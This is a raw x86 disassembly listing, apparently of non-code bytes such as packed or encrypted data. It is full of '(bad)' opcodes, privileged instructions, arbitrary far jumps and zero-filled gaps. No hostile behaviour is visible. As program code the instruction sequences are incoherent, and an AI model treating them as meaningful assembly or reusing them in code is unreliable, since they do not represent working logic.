  421120:	sub    BYTE PTR [eax],cl
  421122:	push   ss
  421123:	lods   eax,DWORD PTR ds:[esi]
  421124:	inc    ebp
  421125:	scas   eax,DWORD PTR es:[edi]
  421126:	or     eax,0xa7117a35
  42112b:	dec    ebp
  42112c:	lea    ebp,[ecx-0x42]
  42112f:	cmp    DWORD PTR [di+0x59],ecx
  421133:	aad    0xc0
  421135:	pusha  
  421136:	or     al,0x6f
  421138:	push   cs
  421139:	mov    BYTE PTR [edx-0x7818b805],bh
  42113f:	rcl    BYTE PTR [ecx+0x67],cl
  421142:	jae    0x421104
  421144:	dec    ecx
  421145:	cmp    ebp,DWORD PTR [ebx-0x758f8897]
  42114b:	adc    esp,DWORD PTR [eax-0x7c71db4c]
  421151:	sbb    edi,DWORD PTR [eax+0x6]
  421154:	mov    al,ds:0x5f9ff915
  421159:	hlt    
  42115a:	xchg   esi,eax
  42115b:	rcr    DWORD PTR [edi-0x4a],cl
  42115e:	fdivrp st(5),st
  421160:	sub    esi,DWORD PTR [edi]
  421162:	stc    
  421163:	or     BYTE PTR [eax],0x13
  421166:	or     BYTE PTR [eax],ch
  421168:	sbb    BYTE PTR [edi+0x15],al
  42116b:	test   BYTE PTR [esi],bh
  42116d:	cmc    
  42116e:	lods   al,BYTE PTR ds:[esi]
  42116f:	xchg   esi,eax
  421170:	mov    ebx,0xcc716a3a
  421175:	pop    es
  421176:	call   0x526bda1f
  42117b:	push   cs
  42117c:	rol    ecx,1
  42117e:	mov    esp,0xb4c064f3
  421184:	pop    es
  421185:	xor    BYTE PTR [eax+edi*8-0x5b],dl
  421189:	and    BYTE PTR [ebp+0x5f],ch
  42118c:	and    eax,0x9ef542bb
  421191:	ret    0x37de
  421194:	(bad)  
  421195:	cmp    ch,BYTE PTR [edi]
  421197:	mov    ah,0x10
  421199:	push   edx
  42119a:	sub    DWORD PTR [ebx-0x34],ecx
  42119d:	stos   DWORD PTR es:[edi],eax
  42119e:	aam    0x7f
  4211a0:	mov    esp,0xf1adda07
  4211a5:	pop    es
  4211a6:	dec    ebx
  4211a7:	fucomip st,st(4)
  4211a9:	xchg   esp,eax
  4211aa:	xchg   ecx,eax
  4211ab:	call   0xd72e2664
  4211b0:	sbb    edx,DWORD PTR [edx]
  4211b2:	test   DWORD PTR [esi],0x78f4cad0
  4211b8:	push   ecx
  4211b9:	test   BYTE PTR [ecx+0x35],bl
  4211bc:	inc    esp
  4211bd:	push   ds
  4211be:	inc    edi
  4211bf:	adc    eax,ecx
  4211c1:	int3   
  4211c2:	inc    BYTE PTR [ebx+0xdeb62d5]
  4211c8:	pop    ebp
  4211c9:	lods   al,BYTE PTR ds:[esi]
  4211ca:	jbe    0x4211be
  4211cc:	xchg   esp,eax
  4211cd:	ret    
  4211ce:	ja     0x42123d
  4211d0:	push   eax
  4211d1:	push   ds
  4211d2:	adc    dh,bl
  4211d4:	push   0xffffffde
  4211d6:	xchg   DWORD PTR [ebx+0x2f2ce4f7],esi
  4211dc:	and    ebx,DWORD PTR [esi+0x50]
  4211df:	pop    ecx
  4211e0:	int    0xbe
  4211e2:	cmp    ah,BYTE PTR [ebp-0x7d296c88]
  4211e8:	in     al,0x43
  4211ea:	cmp    BYTE PTR [ebx],0x5e
  4211ed:	jle    0x42126a
  4211ef:	daa    
  4211f0:	mov    ebx,0x3f3f5ecc
  4211f5:	dec    esi
  4211f6:	push   es
  4211f7:	add    BYTE PTR [edi+0x5],bh
  4211fa:	fdivr  st(4),st
  4211fc:	inc    edx
  4211fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211fe:	sub    BYTE PTR [esi+0x5c],0x4f
  421202:	aad    0x4d
  421204:	mov    edx,0x461de6ae
  421209:	sub    bl,dh
  42120b:	pop    ebp
  42120c:	fldcw  WORD PTR cs:[esi+0x21]
  421210:	mov    eax,0x0
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x3d747ab3
  421282:	enter  0x9d77,0x61
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0xd9000001
  42128d:	pop    ebp
  42128e:	push   0xda2bb6d9
  421293:	xchg   ebp,eax
  421294:	test   al,0x54
  421296:	mov    ebp,0x49d71ae3
  42129b:	jo     0x4212e6
  42129d:	push   ebx
  42129e:	xchg   ecx,eax
  42129f:	cdq    
  4212a0:	push   ebp
  4212a1:	pop    ss
  4212a2:	or     DWORD PTR fs:[eax+0x20379fa2],0xffffffeb
  4212aa:	adc    eax,0xa4b3bcd7
  4212af:	mov    bh,0x96
  4212b1:	clc    
  4212b2:	jae    0x4212a7
  4212b4:	iret   
  4212b5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4212b7:	into   
  4212b8:	xchg   esp,eax
  4212b9:	adc    edx,DWORD PTR [edi]
  4212bb:	and    al,0x43
  4212bd:	cld    
  4212be:	test   al,0x42
  4212c0:	push   edx
  4212c1:	enter  0xebe,0x37
  4212c5:	stos   DWORD PTR es:[edi],eax
  4212c6:	mov    ds:0x5af80226,eax
  4212cb:	fisub  WORD PTR [ecx-0x70c68d77]
  4212d1:	icebp  
  4212d2:	dec    eax
  4212d3:	out    0x3d,al
  4212d5:	(bad)  
  4212d6:	sub    ch,dh
  4212d8:	loope  0x4212d4
  4212da:	loopne 0x4212ea
  4212dc:	mov    edi,0x3c8f045
  4212e1:	lock sub BYTE PTR [esi+ebp*1-0x3d],0x93
  4212e7:	or     BYTE PTR [edx-0x7d],al
  4212ea:	repnz dec edi
  4212ec:	(bad)  
  4212ed:	pop    ebx
  4212ee:	in     al,dx
  4212ef:	cmp    al,0x27
  4212f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212f2:	push   0xffffff83
  4212f4:	add    BYTE PTR [ebx-0x35082ece],ch
  4212fa:	rcl    esp,0xe4
  4212fd:	mov    esp,0x9a67c3d8
  421302:	inc    edi
  421303:	in     al,dx
  421304:	xor    al,0x8e
  421306:	inc    esp
  421307:	adc    al,0x83
  421309:	xchg   BYTE PTR [edi],dh
  42130b:	jle    0x4212a2
  42130d:	xchg   ecx,eax
  42130e:	jne    0x42133c
  421310:	jne    0x421317
  421312:	repnz inc ebp
  421314:	rcl    DWORD PTR [ecx],cl
  421316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421317:	retf   0xa6d5
  42131a:	imul   ebp,DWORD PTR [eax+0x2c],0xffffffbf
  42131e:	jecxz  0x421317
  421320:	mov    ch,dl
  421322:	add    al,0x18
  421324:	sbb    al,0x50
  421326:	or     dl,BYTE PTR [edx]
  421328:	mov    bl,0xcf
  42132a:	mov    esi,ecx
  42132c:	inc    eax
  42132d:	xchg   ebp,ebx
  42132f:	pop    edx
  421330:	cli    
  421331:	cmp    al,0xa3
  421333:	add    DWORD PTR [eax+0x5a1150bf],esp
  421339:	mov    al,0xb2
  42133b:	fimul  DWORD PTR [edx-0x62]
  42133e:	aam    0x76
  421340:	(bad)  
  421342:	retf   0xa820
  421345:	lea    edx,[eax+0x635bcea7]
  42134b:	mov    ch,0x7e
  42134d:	pop    edx
  42134e:	or     cl,BYTE PTR [ecx]
  421350:	jecxz  0x4213c9
  421352:	(bad)  
  421353:	out    0xed,eax
  421355:	pop    ss
  421356:	hlt    
  421357:	mov    esi,0xc1931be0
  42135c:	outs   dx,BYTE PTR ds:[esi]
  42135d:	push   esi
  42135e:	repz xchg ecx,eax
  421360:	pop    esi
  421361:	shr    DWORD PTR [ebx+edx*2-0x3a],0x95
  421366:	sbb    eax,0xd15b21
  42136b:	mov    ch,0xa1
  42136d:	xchg   edi,eax
  42136e:	scas   al,BYTE PTR es:[edi]
  42136f:	sub    ebx,DWORD PTR ss:[edi-0xce3d16c]
  421376:	mov    DWORD PTR [ebx+0xd],edi
  421379:	xchg   edx,eax
  42137a:	sbb    ch,BYTE PTR [ebp-0xf]
  42137d:	jge    0x4213f6
  42137f:	ins    BYTE PTR es:[edi],dx
  421380:	jmp    0x4dd9723f
  421385:	lock sbb bl,0x55
  421389:	loop   0x42138a
  42138b:	ins    BYTE PTR es:[edi],dx
  42138c:	cmp    al,0x75
  42138e:	mov    BYTE PTR [edx],ah
  421390:	and    eax,DWORD PTR [eax]
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x2a4e0b61]
  421402:	lods   eax,DWORD PTR ds:[esi]
  421403:	mov    eax,0x162a2
  421408:	add    eax,0x25000001
  42140d:	push   0xca39c2c1
  421412:	mov    dh,dl
  421414:	out    0x6b,al
  421416:	dec    ebx
  421417:	mov    bh,al
  421419:	out    0xb1,al
  42141b:	in     eax,dx
  42141c:	and    BYTE PTR [edi+0x4b],dh
  42141f:	sub    al,0xb
  421421:	arpl   WORD PTR gs:[esi+0x78],ax
  421425:	push   sp
  421428:	mov    eax,0xa88f8469
  42142d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42142e:	push   0x17
  421430:	(bad)  
  421431:	inc    esp
  421432:	mov    eax,0x36522419
  421437:	sbb    esi,DWORD PTR [edi+edx*2-0x5abd31f4]
  42143e:	repnz repnz not DWORD PTR [ecx+0x6d59d452]
  421446:	push   cs
  421447:	mov    esp,0x93ef3728
  42144c:	add    BYTE PTR [ecx+0x9a1b3bf],0x25
  421453:	mov    DWORD PTR [eax],esi
  421455:	repz mov dh,0x5b
  421458:	inc    ebx
  421459:	out    0x99,eax
  42145b:	or     eax,0xfe4c20db
  421460:	pusha  
  421461:	mov    DWORD PTR [ecx-0xe42aabd],ecx
  421467:	dec    eax
  421468:	test   edi,ecx
  42146a:	push   0x600e6611
  42146f:	xchg   BYTE PTR [edi],bh
  421471:	xor    dl,ah
  421473:	jbe    0x421437
  421475:	shr    DWORD PTR [ebx+0x4d],0xad
  421479:	and    bl,BYTE PTR [ecx]
  42147b:	pxor   mm1,QWORD PTR [edi+0x57]
  42147f:	add    ah,bl
  421481:	xrelease mov BYTE PTR [edi-0x476e4d85],al
  421488:	jns    0x4214b8
  42148a:	or     esi,DWORD PTR [edi]
  42148c:	icebp  
  42148d:	test   BYTE PTR [ebp-0x6],cl
  421490:	mov    dl,cl
  421492:	jae    0x42144e
  421494:	loopne 0x4214de
  421496:	cld    
  421497:	push   esi
  421498:	add    esi,DWORD PTR [ebx]
  42149a:	dec    ebx
  42149b:	inc    ebx
  42149c:	lahf   
  42149d:	fisub  DWORD PTR [ebp+eiz*8+0x282bf1d1]
  4214a4:	mov    ah,0x10
  4214a6:	and    BYTE PTR [esi+edx*2+0x1a5cb03],ch
  4214ad:	and    dl,BYTE PTR es:[ebp+0x29]
  4214b1:	loop   0x421500
  4214b3:	or     DWORD PTR [esi+0x7f38348b],esp
  4214b9:	sbb    eax,0x759ac78
  4214be:	push   edx
  4214bf:	popf   
  4214c0:	push   0x74
  4214c2:	in     al,dx
  4214c3:	pushf  
  4214c4:	sbb    ah,BYTE PTR [edi]
  4214c6:	mov    bl,0x6
  4214c8:	lock leave 
  4214ca:	add    DWORD PTR [esi],edi
  4214cc:	ret    0x898c
  4214cf:	std    
  4214d0:	and    al,0xf9
  4214d2:	or     DWORD PTR [edx-0x2c],ecx
  4214d5:	das    
  4214d6:	je     0x42150d
  4214d8:	cmp    BYTE PTR [edi],al
  4214da:	in     al,0xf5
  4214dc:	sub    eax,0x4062b8d2
  4214e1:	mov    ds:0x111fd0de,al
  4214e6:	sbb    bh,BYTE PTR [ebx]
  4214e8:	xchg   ebx,eax
  4214e9:	cmp    DWORD PTR [ecx+0x13675576],edi
  4214ef:	xchg   esp,eax
  4214f0:	test   eax,0x3c1fc58d
  4214f5:	leave  
  4214f6:	mov    al,0xb8
  4214f8:	test   eax,0x471713b7
  4214fd:	daa    
  4214fe:	outs   dx,DWORD PTR ds:[esi]
  4214ff:	dec    ebp
  421500:	dec    eax
  421501:	jns    0x4214e4
  421503:	jmp    0xc975:0x5c5e0458
  42150a:	mov    ss,WORD PTR [eax+0x771cd553]
  421510:	xlat   BYTE PTR ds:[ebx]
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x28bd4c],bp
  421582:	mov    edx,0x163a7d2
  421587:	add    BYTE PTR ds:0x65000001,al
  42158d:	cmp    al,0xb
  42158f:	repz sub bl,al
  421592:	icebp  
  421593:	cmp    al,0xc
  421595:	loop   0x421565
  421597:	sahf   
  421598:	adc    ch,BYTE PTR [ecx-0x7f7651b9]
  42159e:	addr16 mov esp,0xb7309b0d
  4215a4:	and    ch,BYTE PTR [edi-0x36163c4]
  4215aa:	cmp    edi,DWORD PTR [ebx+ebx*2]
  4215ad:	fstp   TBYTE PTR [ecx]
  4215af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215b0:	xchg   ecx,esp
  4215b2:	xchg   DWORD PTR [edi],esp
  4215b4:	sbb    eax,0xdef0cc0b
  4215b9:	dec    esi
  4215ba:	ret    
  4215bb:	clc    
  4215bc:	and    eax,0xa1452b96
  4215c1:	cwde   
  4215c2:	jge    0x4215ac
  4215c4:	hlt    
  4215c5:	rcl    ch,0x8e
  4215c8:	and    dh,BYTE PTR [esi-0x31]
  4215cb:	enter  0xfff2,0xe4
  4215cf:	dec    ebx
  4215d0:	mov    eax,0x99734d6f
  4215d5:	cmovl  ecx,DWORD PTR [ebx]
  4215d8:	sub    BYTE PTR [esi],dh
  4215da:	enter  0xed61,0x6c
  4215de:	lods   al,BYTE PTR ds:[esi]
  4215df:	popf   
  4215e0:	push   esi
  4215e1:	jns    0x4215dc
  4215e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215e4:	leave  
  4215e5:	int3   
  4215e6:	xlat   BYTE PTR ds:[ebx]
  4215e7:	jge    0x4215df
  4215e9:	ja     0x421664
  4215eb:	sbb    al,BYTE PTR [esi]
  4215ed:	sub    DWORD PTR [edx-0x2d],eax
  4215f0:	sti    
  4215f1:	repnz xchg ecx,eax
  4215f3:	or     DWORD PTR [eax],ebp
  4215f5:	data16 das 
  4215f7:	mov    ch,0x9e
  4215f9:	jmp    0x2526:0xb1f93b47
  421600:	cmp    esi,esi
  421602:	inc    ecx
  421603:	push   ds
  421604:	fsub   DWORD PTR [edx]
  421606:	test   eax,0x81776784
  42160b:	out    dx,eax
  42160c:	ficomp WORD PTR [eax]
  42160e:	mov    ds:0x9dee7155,eax
  421613:	cmp    dh,BYTE PTR [edx+0x51]
  421616:	xor    ebp,DWORD PTR [eax-0x38]
  421619:	xor    eax,0x22622674
  42161e:	repnz sbb DWORD PTR [ecx-0x40],esp
  421622:	pop    ebx
  421623:	fld    DWORD PTR [esi]
  421625:	xor    DWORD PTR [eax+0x7663729b],ebp
  42162b:	popa   
  42162c:	test   eax,0xb103cdd8
  421631:	imul   esp,DWORD PTR [ebx-0x6e32f09b],0xd335de34
  42163b:	push   ebx
  42163d:	outs   dx,DWORD PTR ds:[esi]
  42163e:	jno    0x4216bc
  421640:	dec    ebp
  421641:	outs   dx,BYTE PTR ds:[esi]
  421642:	mov    ?,WORD PTR [ecx-0x18]
  421645:	add    bl,BYTE PTR [esi+0x38d2b2eb]
  42164b:	add    eax,DWORD PTR [edi]
  42164d:	jg     0x421604
  42164f:	into   
  421650:	sti    
  421651:	adc    al,0x72
  421653:	bound  eax,QWORD PTR [edi-0x3f]
  421656:	in     eax,dx
  421657:	mov    bl,0x8d
  421659:	fcom   DWORD PTR [esi-0x1f]
  42165c:	adc    ah,dl
  42165e:	xchg   edi,eax
  42165f:	inc    esi
  421660:	daa    
  421661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421662:	es hlt 
  421664:	sub    al,BYTE PTR [eax+0x15]
  421667:	adc    esi,edi
  421669:	xor    eax,0x9b2a49e9
  42166e:	mov    bl,0x2b
  421670:	jmp    0x7bb4:0xe758e43f
  421677:	aam    0xaf
  421679:	test   al,0x14
  42167b:	nop    ebp
  42167e:	jns    0x42168d
  421680:	repz pop edi
  421682:	pop    esp
  421683:	mov    WORD PTR ss:[edi],ss
  421686:	pop    ss
  421687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421688:	cmp    BYTE PTR [ecx+0x2d],cl
  42168b:	test   al,0xc3
  42168d:	and    al,0x39
  42168f:	cmp    al,0xe1
	...
  4216f1:	add    BYTE PTR [eax],al
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	dec    ebx
  421701:	push   ebp
  421702:	jg     0x4216fa
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0x4b000001
  42170d:	adc    DWORD PTR [esi+0x5b],eax
  421710:	mov    dh,0x2
  421712:	xor    ah,0x25
  421715:	les    edx,FWORD PTR [esi]
  421717:	push   0x2f
  421719:	add    eax,0x29c3a5f7
  42171e:	xchg   ebx,eax
  42171f:	add    esi,DWORD PTR [ecx]
  421721:	into   
  421722:	dec    edx
  421723:	push   ecx
  421724:	adc    al,0xea
  421726:	xchg   ecx,edx
  421728:	mov    esi,0x879551e2
  42172d:	stos   BYTE PTR es:[edi],al
  42172e:	xchg   BYTE PTR [eax],bh
  421730:	jb     0x4216b7
  421732:	in     al,dx
  421733:	and    DWORD PTR [ebp-0x1b],edi
  421736:	sbb    ch,BYTE PTR [edi+0x4f6a2779]
  42173c:	call   0x89bb1fa9
  421741:	xchg   BYTE PTR [ebx-0x11740188],cl
  421747:	(bad)  [eax-0x3f9333c3]
  42174d:	sahf   
  42174e:	mov    eax,0x1b513606
  421753:	out    dx,al
  421754:	inc    ebx
  421755:	cs pop ds
  421757:	test   eax,0x582ab4c
  42175c:	pop    ds
  42175d:	int3   
  42175e:	cmp    al,0xd4
  421760:	mov    WORD PTR [edx],ds
  421762:	push   esp
  421763:	shl    DWORD PTR [ecx+0x68c29032],0x13
  42176a:	hlt    
  42176b:	jmp    0x990b:0xc5310d5a
  421772:	dec    ebx
  421773:	retf   0xf052
  421776:	lock push edx
  421778:	test   eax,0xc59aa2d4
  42177d:	aad    0xd4
  42177f:	loope  0x42174a
  421781:	(bad)  
  421782:	cmp    eax,DWORD PTR [ecx+0xa]
  421785:	cmp    eax,0x9a7d199b
  42178a:	imul   esi,DWORD PTR ds:[edi+0x1b166c01],0x42dd41ba
  421795:	push   ecx
  421796:	test   ebx,ebx
  421798:	add    bl,dh
  42179a:	std    
  42179b:	ret    0x5e23
  42179e:	adc    al,0x5
  4217a0:	jb     0x4217a3
  4217a2:	xor    al,0x2c
  4217a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217a5:	xor    eax,0x478cfe1e
  4217aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217ab:	out    dx,al
  4217ac:	mov    dl,0x32
  4217ae:	mov    esp,0x8d294f8a
  4217b3:	aaa    
  4217b4:	cmc    
  4217b5:	jge    0x4217f4
  4217b7:	jecxz  0x42178d
  4217b9:	sub    edx,ecx
  4217bb:	inc    esp
  4217bc:	inc    DWORD PTR [edi]
  4217be:	imul   ecx,esi,0x83275190
  4217c4:	(bad)  
  4217c5:	dec    esp
  4217c6:	es jmp 0xc6a4069
  4217cc:	je     0x42176a
  4217ce:	jl     0x421774
  4217d0:	cmp    al,0xb2
  4217d2:	push   esp
  4217d3:	aas    
  4217d4:	arpl   WORD PTR [edx],si
  4217d6:	sbb    eax,DWORD PTR [eax+eiz*4-0x52]
  4217da:	test   eax,0xaf5c4d81
  4217df:	sahf   
  4217e0:	call   0xbab7:0xff9f5d11
  4217e7:	loopne 0x4217cd
  4217e9:	(bad)  
  4217ea:	mov    ebx,0xb8838916
  4217ef:	imul   ebx,DWORD PTR [esi+0x31470a17],0x73
  4217f6:	rcl    BYTE PTR ds:0x55d4b094,1
  4217fc:	retf   0x8d96
  4217ff:	dec    ebp
  421800:	mov    ah,0x54
  421802:	mov    ecx,0xe8858c26
  421807:	add    bh,BYTE PTR [ecx+0x5c9b9972]
  42180d:	inc    ecx
  42180e:	std    
  42180f:	fild   WORD PTR [eax+0x0]
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	test   BYTE PTR [esi],dh
  421882:	je     0x421809
  421884:	mov    cl,0x65
  421886:	add    DWORD PTR [eax],eax
  421888:	add    eax,0x73000001
  42188d:	jmp    0xfbe2:0x6a3c30cf
  421894:	mov    cl,ch
  421896:	call   0x8330dbf
  42189b:	or     BYTE PTR [ebx],dl
  42189d:	jp     0x4218ba
  42189f:	mov    ebx,DWORD PTR [edx+0x370841cd]
  4218a5:	jg     0x4218db
  4218a7:	dec    edx
  4218a8:	mov    ecx,0x566cde4c
  4218ad:	xchg   ebx,eax
  4218ae:	or     BYTE PTR [esi-0x54822a6d],0x15
  4218b5:	pusha  
  4218b6:	dec    esp
  4218b7:	mov    ds:0xb1f41a0c,eax
  4218bc:	adc    eax,eax
  4218be:	cdq    
  4218bf:	and    BYTE PTR [edx+ebx*4],ah
  4218c2:	ret    0xb0a
  4218c5:	push   es
  4218c6:	pop    edx
  4218c7:	inc    edx
  4218c8:	sub    BYTE PTR [edi-0x39d57e5c],bh
  4218ce:	mov    bh,0x10
  4218d0:	cmp    al,0x12
  4218d2:	xchg   edi,eax
  4218d3:	xchg   esi,eax
  4218d4:	cmp    BYTE PTR [ecx*4-0x487f7150],dh
  4218db:	sbb    dh,cl
  4218dd:	jecxz  0x421861
  4218df:	xor    BYTE PTR [ebx+esi*4+0x57c15cad],ch
  4218e6:	inc    edi
  4218e7:	jbe    0x4218a9
  4218e9:	mov    al,ds:0x731eec59
  4218ee:	sbb    eax,0x3bc0de3d
  4218f3:	jp     0x42189c
  4218f5:	pop    ecx
  4218f6:	and    edx,DWORD PTR [eax+0x74]
  4218f9:	or     edi,ebp
  4218fb:	push   esi
  4218fc:	aas    
  4218fd:	dec    ebx
  4218fe:	xchg   ecx,edx
  421900:	sbb    edi,DWORD PTR [eax+0x5742e5de]
  421906:	sub    dl,dl
  421908:	neg    esi
  42190a:	popa   
  42190b:	nop
  42190c:	adc    dh,ah
  42190e:	es inc esp
  421910:	inc    esi
  421911:	fisubr DWORD PTR [ebp+0x56]
  421914:	dec    ecx
  421915:	jno    0x42194d
  421917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421918:	js     0x42194c
  42191a:	cdq    
  42191b:	add    ebp,edx
  42191d:	jno    0x4218b8
  42191f:	outs   dx,BYTE PTR ds:[esi]
  421920:	mov    bh,0xa3
  421922:	sar    BYTE PTR [edx+0x63],cl
  421925:	jge    0x4219a5
  421927:	shl    DWORD PTR [esi-0x5d3c7f73],0x92
  42192e:	sbb    al,al
  421930:	xchg   ebp,eax
  421931:	ins    DWORD PTR es:[edi],dx
  421932:	and    al,0x4c
  421934:	test   DWORD PTR [ecx],eax
  421936:	outs   dx,BYTE PTR ds:[esi]
  421937:	test   DWORD PTR fs:[eax+ebp*4+0x4691e43f],ecx
  42193f:	test   dh,0x8c
  421942:	int3   
  421943:	icebp  
  421944:	add    BYTE PTR [ebx-0x5027eaab],ah
  42194a:	call   DWORD PTR [edi+eax*8+0x20]
  42194e:	or     edi,ebp
  421950:	mov    esp,0xaff00a1e
  421955:	xchg   ecx,eax
  421956:	jae    0x42192a
  421958:	xchg   esp,eax
  421959:	mov    al,ds:0xe47573e4
  42195e:	out    dx,eax
  42195f:	test   eax,0x550d35c
  421964:	clc    
  421965:	push   es
  421966:	mov    DWORD PTR [ecx-0x6502c049],0xc39c7df8
  421970:	retf   
  421971:	std    
  421972:	dec    ecx
  421973:	imul   DWORD PTR [edx-0xe3f69e1]
  421979:	sub    eax,0xc5a96444
  42197e:	das    
  42197f:	pop    es
  421980:	lods   al,BYTE PTR fs:[esi]
  421982:	add    bl,BYTE PTR [ebx*8+0x289ce33f]
  421989:	inc    eax
  42198a:	aad    0x4c
  42198c:	push   ss
  42198d:	xor    ch,BYTE PTR [ebp-0x65]
  421990:	out    0x0,al
	...
  4219f2:	add    BYTE PTR [eax],al
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	add    esi,ecx
  421a02:	mov    ?,esi
  421a04:	mov    dh,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    eax,0x84000001
  421a0d:	test   al,0x45
  421a0f:	clc    
  421a10:	jbe    0x4219b4
  421a12:	bound  esi,QWORD PTR fs:[ebp-0x43]
  421a16:	aad    0x5f
  421a18:	hlt    
  421a19:	(bad)  
  421a1a:	sbb    al,0x77
  421a1c:	and    ah,0x72
  421a1f:	stos   DWORD PTR es:[edi],eax
  421a20:	les    esi,FWORD PTR [ebx-0x312a92de]
  421a26:	(bad)  
  421a27:	mov    ebx,0x4f738a7f
  421a2c:	dec    esp
  421a2d:	pop    es
  421a2e:	mov    ch,ah
  421a30:	inc    esp
  421a31:	cmp    bh,BYTE PTR [eax+0x71]
  421a34:	(bad)  
  421a35:	pop    ss
  421a36:	mov    esi,0xf4ce7f74
  421a3b:	(bad)  
  421a3c:	icebp  
  421a3d:	cs cwde 
  421a3f:	fidivr DWORD PTR [ebx-0x2d]
  421a42:	cs mov cl,0x9c
  421a45:	xlat   BYTE PTR ds:[ebx]
  421a46:	js     0x4219c8
  421a48:	rcl    BYTE PTR [esi+0x6e1217db],1
  421a4e:	js     0x421a01
  421a50:	jp     0x421a74
  421a52:	inc    ecx
  421a53:	shr    esp,1
  421a55:	stos   BYTE PTR es:[edi],al
  421a56:	push   0x39
  421a58:	xchg   ecx,eax
  421a59:	xor    DWORD PTR [ebx],0x60
  421a5c:	test   al,0x51
  421a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a5f:	and    ch,BYTE PTR [edx]
  421a61:	cmp    al,0xd6
  421a63:	ror    BYTE PTR [edi],0xee
  421a66:	push   edi
  421a67:	gs ins BYTE PTR es:[edi],dx
  421a69:	(bad)  
  421a6a:	rcpps  xmm4,XMMWORD PTR [eax]
  421a6d:	pushf  
  421a6e:	ja     0x421a9b
  421a70:	bound  esp,QWORD PTR [esi+ecx*4-0x657ba505]
  421a77:	std    
  421a78:	push   ebx
  421a79:	rcr    esp,cl
  421a7b:	pop    edx
  421a7c:	xchg   ecx,eax
  421a7d:	sbb    edx,DWORD PTR [edi-0x2238dabf]
  421a83:	cdq    
  421a84:	xchg   ebx,eax
  421a85:	aam    0xbe
  421a87:	enter  0x3b67,0xcd
  421a8b:	and    al,0x1e
  421a8d:	add    al,0xa7
  421a8f:	fs loop 0x421a9e
  421a92:	aad    0xb9
  421a94:	mov    edi,0xca818a49
  421a99:	out    0x22,eax
  421a9b:	out    0x8d,eax
  421a9d:	xor    eax,0x4193ffe0
  421aa2:	push   0x35
  421aa4:	inc    esp
  421aa5:	push   ds
  421aa6:	or     DWORD PTR [ebx-0x71ae75d3],edi
  421aac:	inc    ebp
  421aad:	sub    DWORD PTR [ebp*2-0x3da3fae3],ebx
  421ab4:	push   esp
  421ab5:	adc    bh,BYTE PTR [ebx-0x794f355a]
  421abb:	jl     0x421a41
  421abd:	iret   
  421abe:	sti    
  421abf:	sub    esp,esi
  421ac1:	add    DWORD PTR [esi+eax*2+0x53],0x24
  421ac6:	mov    cl,0xaf
  421ac8:	sub    eax,0xb3c70a56
  421acd:	adc    ebx,ebx
  421acf:	lock mov ds:0xbcb58818,al
  421ad5:	mov    al,ds:0x9f4c03b5
  421ada:	dec    ecx
  421adb:	mov    ecx,0x1fa429f2
  421ae0:	and    eax,0x541dae09
  421ae5:	add    bl,ah
  421ae7:	je     0x421a7f
  421ae9:	frstor [ecx]
  421aeb:	cmp    eax,0xd75c2f8d
  421af0:	or     al,0xbc
  421af2:	aas    
  421af3:	push   ebp
  421af4:	fisttp WORD PTR [eax-0x70]
  421af7:	fisubr WORD PTR [ebp-0x4edfbac8]
  421afd:	and    eax,0x4dce0711
  421b02:	call   0x161b:0x9921d7c0
  421b09:	ficom  WORD PTR [edx-0x453d10d9]
  421b0f:	xor    ax,0x0
	...
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dh,BYTE PTR [esi-0x2f]
  421b82:	ds mov al,0xbb
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    eax,0xea000001
  421b8d:	jmp    0x8a20d8e
  421b92:	cmp    BYTE PTR [ebp+0x1db5a697],bl
  421b98:	outs   dx,BYTE PTR gs:[esi]
  421b9a:	sbb    DWORD PTR [ebp+ebp*8-0x1572062c],ebx
  421ba1:	mov    BYTE PTR [edi-0x7f],cl
  421ba4:	pop    edi
  421ba5:	mov    bh,0x53
  421ba7:	mov    eax,ds:0x1bb2518d
  421bac:	sti    
  421bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bae:	or     al,BYTE PTR [ebx+ecx*4]
  421bb1:	and    eax,edx
  421bb3:	dec    ebx
  421bb4:	int3   
  421bb5:	(bad)  
  421bb7:	ror    DWORD PTR [ebx-0x386710a8],1
